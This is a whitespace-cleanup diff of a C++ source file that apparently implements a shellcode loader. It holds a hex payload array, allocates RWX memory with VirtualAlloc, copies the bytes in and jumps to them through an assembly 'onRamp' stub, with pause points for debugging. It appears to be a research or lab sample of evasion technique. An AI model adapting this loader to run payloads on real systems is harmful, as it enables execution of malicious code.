@@ -7,20 +7,20 @@ unsigned char payload[] = "\x4C\x8D\x3C\x24\x48\x83\xC4\x08\x4C\x8D\x2C\x24\x48\
 size_t payload_len = sizeof(payload);
 
 extern "C" void onRamp(PVOID exec_mem, PVOID ret_addr);
-extern "C" void offRamp(void); 
+extern "C" void offRamp(void);
 
 PVOID return_address = NULL;
 
 void FunctionTwo(void){
 	//allocate memory
 	auto exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	
+
 	//move paylaod to our buffer
 	RtlMoveMemory(exec_mem, payload, payload_len);
-	
+
 	printf("Execute payload?\n");
 	getchar(); 								//quasi-break-point
-	
+
 	//execute payload
     onRamp(exec_mem, return_address);
 	return;
@@ -30,12 +30,12 @@ void FunctionOne(void){
 	printf("FunctionOne!\n");
 	getchar(); 								//quasi-break-point
 	FunctionTwo();
-	return;									
+	return;
 }
 
 int main(void){
 	printf("Entering main function...\n");
-	
+
 //get address and add the standard offset (post FunctionOne())
 asm(".intel_syntax noprefix;"
 	"lea rax, [rip];"
@@ -47,7 +47,7 @@ asm(".intel_syntax noprefix;"
 	FunctionOne();
 	printf("Exiting main function...\n");	//offRamp returns here
 	//getchar();
-	
+
 	return 0;
 }
 
